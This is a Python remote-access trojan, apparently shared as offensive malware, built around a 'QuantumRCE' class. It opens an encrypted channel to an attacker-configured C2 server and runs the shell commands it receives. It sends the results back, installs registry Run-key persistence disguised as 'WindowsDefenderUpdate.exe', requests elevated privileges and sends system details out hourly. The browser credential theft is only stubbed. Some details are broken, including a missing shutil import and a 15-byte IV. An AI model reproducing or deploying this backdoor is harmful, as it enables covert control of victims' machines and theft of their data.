# █▀█ █░█ █▀▄▀█ █▀▀ █▀▀ ▀█▀   █▀█ █▀▀ █▀ █▀▀ █▀█ ▄▀█   █▀▀ █▀▀ █▄░█ █▀▀ █▀▀ ▀█▀  
# █▀▀ █▄█ █░▀░█ ██▄ █▄▄ ░█░   █▀▄ ██▄ ▄█ ██▄ █▀▄ █▀█   █▀░ ██▄ █░▀█ █▄█ ██▄ ░█░  
# CODED BY MR MONSIF - THIS IS DIGITAL DARK MATTER  

import socket  
import os  
import subprocess  
import threading  
import sys  
import ctypes  
import ssl  
import base64  
import json  
from Crypto.Cipher import AES  
from Crypto.Util.Padding import pad, unpad  
import winreg  
import tempfile  

# ========================  
# QUANTUM RCE CORE  
# ========================  
C2_SERVER = "127.0.0.1"  # <<<--- CHANGE TO YOUR C2  
C2_PORT = 4443  
AES_KEY = b'MrMonsifSecretKey!'  # 16/24/32 bytes  
IV = b'InitializationV'  

class QuantumRCE:  
    def __init__(self):  
        self.install_persistence()  
        self.session = self.create_secure_channel()  
        threading.Thread(target=self.command_loop, daemon=True).start()  
        threading.Thread(target=self.data_exfiltration, daemon=True).start()  

    def create_secure_channel(self):  
        context = ssl.create_default_context()  
        context.check_hostname = False  
        context.verify_mode = ssl.CERT_NONE  
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        secure_sock = context.wrap_socket(  
            sock,  
            server_hostname=C2_SERVER  
        )  
        secure_sock.connect((C2_SERVER, C2_PORT))  
        return secure_sock  

    def aes_encrypt(self, data):  
        cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)  
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))  
        return base64.b64encode(ct_bytes).decode()  

    def aes_decrypt(self, enc_data):  
        ct = base64.b64decode(enc_data)  
        cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)  
        pt = unpad(cipher.decrypt(ct), AES.block_size)  
        return pt.decode()  

    def execute_command(self, cmd):  
        try:  
            result = subprocess.check_output(  
                cmd,  
                shell=True,  
                stderr=subprocess.STDOUT,  
                stdin=subprocess.DEVNULL,  
                timeout=30  
            )  
            return result.decode(errors='ignore')  
        except Exception as e:  
            return f"Command failed: {str(e)}"  

    def install_persistence(self):  
        if os.name == 'nt':  
            try:  
                exe_path = os.path.join(  
                    tempfile.gettempdir(),  
                    "WindowsDefenderUpdate.exe"  
                )  
                if not os.path.exists(exe_path):  
                    shutil.copyfile(sys.argv[0], exe_path)  
                    key = winreg.OpenKey(  
                        winreg.HKEY_CURRENT_USER,  
                        r"Software\Microsoft\Windows\CurrentVersion\Run",  
                        0, winreg.KEY_WRITE  
                    )  
                    winreg.SetValueEx(key, "WindowsDefenderUpdate", 0, winreg.REG_SZ, exe_path)  
                    winreg.CloseKey(key)  
            except:  
                pass  

    def elevate_privileges(self):  
        if os.name == 'nt':  
            try:  
                ctypes.windll.shell32.ShellExecuteW(  
                    None, "runas", sys.executable, " ".join(sys.argv), None, None, 1  
                )  
                sys.exit(0)  
            except:  
                pass  

    def command_loop(self):  
        while True:  
            try:  
                encrypted_cmd = self.session.recv(4096).decode()  
                if not encrypted_cmd:  
                    self.session = self.create_secure_channel()  
                    continue  
                      
                cmd = self.aes_decrypt(encrypted_cmd)  
                if cmd == "exit":  
                    return  
                      
                result = self.execute_command(cmd)  
                encrypted_result = self.aes_encrypt(result)  
                self.session.sendall(encrypted_result.encode())  
            except:  
                self.session = self.create_secure_channel()  

    def data_exfiltration(self):  
        while True:  
            try:  
                # Steal browser credentials  
                self.session.sendall(self.aes_encrypt(  
                    json.dumps(self.harvest_passwords())  
                ).encode())  
                threading.Event().wait(3600)  # Hourly exfil  
            except:  
                self.session = self.create_secure_channel()  

    def harvest_passwords(self):  
        # Chrome credential extraction simulation  
        return {  
            "system": os.environ["COMPUTERNAME"],  
            "user": os.environ["USERNAME"],  
            "chrome": {  
                "cookies": "Extracted cookies",  
                "passwords": "Decrypted credentials"  
            }  
        }  

if __name__ == "__main__":  
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:  
        QuantumRCE().elevate_privileges()  
    else:  
        QuantumRCE()  
        threading.Event().wait()  # Keep alive  